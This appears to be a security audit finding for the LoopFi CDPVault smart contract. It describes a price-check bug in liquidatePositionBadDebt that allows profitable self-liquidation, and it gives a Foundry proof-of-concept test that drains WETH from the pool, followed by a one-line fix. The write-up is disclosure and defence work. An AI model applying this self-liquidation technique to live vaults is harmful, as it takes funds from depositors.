# Vulnerability details

## Impact

When a position's debt to collateral ratio is under `liquidationRatio` it can be liquidated using [`liquidatePosition`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L509), and as soon as the existing collateral is not enough to pay for the existing debt, as the [comments](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L504-L505) say, the vault accumulates "bad debt" and the position can be liquidated through [`liquidatePositionBadDebt`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L579).

However a position that does **not** have bad debt can still be liquidated using `liquidatePositionBadDebt` and report loss to [`PoolV3`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/PoolV3.sol). 
This happens due to a bug in the `liquidatePositionBadDebt` function where, instead of using `spotPrice_` to calculate the real value of the position's collateral, `discountedPrice` is used:
```solidity
if (calcTotalDebt(debtData) <= wmul(position.collateral, discountedPrice)) revert CDPVault__noBadDebt();
```

Since a price lower than `spotPrice_` is used, the collateral's value is calculated inaccurately, appearing lower than it actually is. If the debt exceeds this undervalued amount but remains bellow the correct amount, it will still be treated as bad debt, allowing the function's full execution. 

As no penalty is charged in `liquidatePositionBadDebt` self-liquidations become possible, and so, a malicious user can steal funds from `CDPVault`. He would borrow `WETH` from `CDPVault`, wait until his debt is still bigger than the value of his collateral at `spotPrice` but lower than the value of his collateral at `discountedPrice`, then he can self-liquidate it through `liquidatePositionBadDebt`. 
The Vault reports a loss to `PoolV3` when in reality no loss occurred and the attacker effectively steals the value of the discount and successfully gets his collateral back without paying any interest.

To exemplify:
Assume a liquidation discount of `8%` and starting rate of `1 WETH` per `Pendle`
- Bob deposits `100 Pendle`
- Bob borrows `80 WETH`
- The spot price of Pendle decreases to `0,82 WETH`
The discounted price of Pendle is `0,75 WETH`
Some interest is accrued
Bob's position is now unhealthy but does not have bad debt considering `spotPrice`
But if we consider Bob's collateral at `discountedPrice` he has bad debt
- Bob self-liquidates the position through `liquidatePositionBadDebt`
He gets his collateral back (`100 Pendle`)
But only pays back `75 WETH` (the value of collateral at discounted price)
- Bob stole `5 WETH` from the Vault and avoided paying all interests he owed.

Then impact of this exploit depends on:
- The amount of the borrowed WETH made by the attacker; 
- The size of the liquidation discount set for `CDPVault`;
The bigger the discount the bigger is the impact.
- The amount of interests accrued until the self-liquidation is executed
## Proof of Concept
Bellow is the coded PoC. Paste it in [`CDPVault.t.sol`]
```solidity
    function test_BadDebtBug_stealFunds_cid() public {
        address alice = makeAddr("alice");
        // create vault with 10% liquidation discount
        CDPVault vault = createCDPVault(token, 150 ether, 2 ether, 1.25 ether, 1 ether, 0.92 ether);
        createGaugeAndSetGauge(address(vault));
        LiquidationConfig memory liqConfig;
        (, liqConfig.liquidationDiscount) = vault.liquidationConfig();
        uint256 poolWethBalanceBefore = mockWETH.balanceOf(address(liquidityPool));

        // alice deposits 100 ether
        uint256 depositAmount = 100 ether;
        deal(address(token), alice, depositAmount);
        vm.startPrank(alice);
        token.approve(address(vault), depositAmount);
        vault.deposit(alice, depositAmount);

        // alice borrows 80 ether
        uint256 borrowAmount = 80 ether;
        vault.borrow(alice, alice, borrowAmount);
        assertEq(mockWETH.balanceOf(alice), borrowAmount);
        assertEq(vault.totalDebt(), uint256(borrowAmount));
        vm.stopPrank();

        // position becomes unhealthy due to price movement & interest but does not enter badDebt
        _updateSpot(0.82 ether);
        vm.warp(block.timestamp + 60 days);
        uint256 debt = virtualDebt(vault, alice);
        (uint256 collateral, , , , , ) = vault.positions(alice);
        uint256 spotPrice_ = vault.spotPrice();
        uint256 discountedPrice = (spotPrice_ * liqConfig.liquidationDiscount) / 1 ether;
        bool isBadDebt = debt > ((collateral * spotPrice_)/1 ether);
        assertFalse(isBadDebt); //position does not have bad debt

        // alice can liquidate his the position as bad debt
        vm.startPrank(alice);
        mockWETH.approve(address(vault), 80 ether);
        vault.liquidatePositionBadDebt(alice, 80 ether);     
        uint256 repayAmount = (collateral * discountedPrice) / 1 ether;
        uint256 poolWethBalanceAfter = mockWETH.balanceOf(address(liquidityPool));
        assertEq(poolWethBalanceBefore - poolWethBalanceAfter, borrowAmount - repayAmount); //Pool loses funds
        assertEq(mockWETH.balanceOf(alice), borrowAmount - repayAmount); // alice steals weth
    }    
    struct LiquidationConfig {
        /// @notice Penalty applied during liquidation [wad]
        uint64 liquidationPenalty;
        /// @notice Discount on collateral during liquidation [wad]
        uint64 liquidationDiscount;
    }     
```

## Recommended Mitigation Steps
Consider changing [this](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L599) to calculate the collateral's value using `spotPrice_` instead of `discountedPrice`
```solidity
if (calcTotalDebt(debtData) <= wmul(position.collateral, spotPrice_)) revert CDPVault__noBadDebt();
```
